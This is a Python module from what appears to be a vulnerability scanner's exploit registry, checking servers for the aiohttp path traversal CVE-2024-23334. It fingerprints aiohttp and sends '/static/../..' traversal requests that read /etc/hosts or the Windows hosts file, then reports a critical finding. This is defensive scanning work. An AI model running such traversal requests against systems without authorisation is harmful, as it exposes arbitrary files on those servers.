"""Agent Asteroid implementation for CVE-2024-23334"""

from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions
import requests

from agent import definitions
from agent import exploits_registry
from agent.exploits import common

VULNERABILITY_TITLE = "AIOHTTP Path Traversal"
VULNERABILITY_REFERENCE = "CVE-2024-23334"
VULNERABILITY_DESCRIPTION = (
    "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. "
    "When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for "
    "static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic "
    "links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check "
    "if reading a file is within the root directory. This can lead to directory traversal vulnerabilities, resulting "
    "in unauthorized access to arbitrary files on the system, even when symlinks are not present. Disabling "
    "follow_symlinks and using a reverse proxy are encouraged mitigations. Version 3.9.2 fixes this issue."
)

DEFAULT_TIMEOUT = 30
AIOHTTP_KEYWORD = "aiohttp/"

HOSTS_INDICATOR = "127.0.0.1"
PATHS = ["/etc/hosts", "/Windows/System32/drivers/etc/hosts"]
DEPTH = 10


@exploits_registry.register
class CVE202423334Exploit(definitions.Exploit):
    """
    CVE-2024-23334: AIOHTTP Path Traversal
    """

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = self.session.get(
                target.origin,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return False

        return AIOHTTP_KEYWORD in resp.headers.get("Server", "")

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        req = requests.Request(method="GET", url=target.origin).prepare()

        for level in range(1, DEPTH + 1):
            for path in PATHS:
                try:
                    target_endpoint = target.origin + "/static" + "/.." * level + path
                    req.url = target_endpoint
                    response = self.session.send(req, timeout=DEFAULT_TIMEOUT)
                    if HOSTS_INDICATOR in response.text:
                        vulnerability = self._create_vulnerability(target)
                        return [vulnerability]
                except requests_exceptions.RequestException:
                    return []

        return []

    def _create_vulnerability(
        self, target: definitions.Target
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=False,
            targeted_by_ransomware=False,
            targeted_by_nation_state=False,
        )
        technical_detail = (
            f"{target.url} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability_location = common.build_vuln_location(target.url)
        dna = common.compute_dna(
            vulnerability_title=VULNERABILITY_TITLE,
            vuln_location=vulnerability_location,
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
            vulnerability_location=vulnerability_location,
            dna=dna,
        )
        return vulnerability
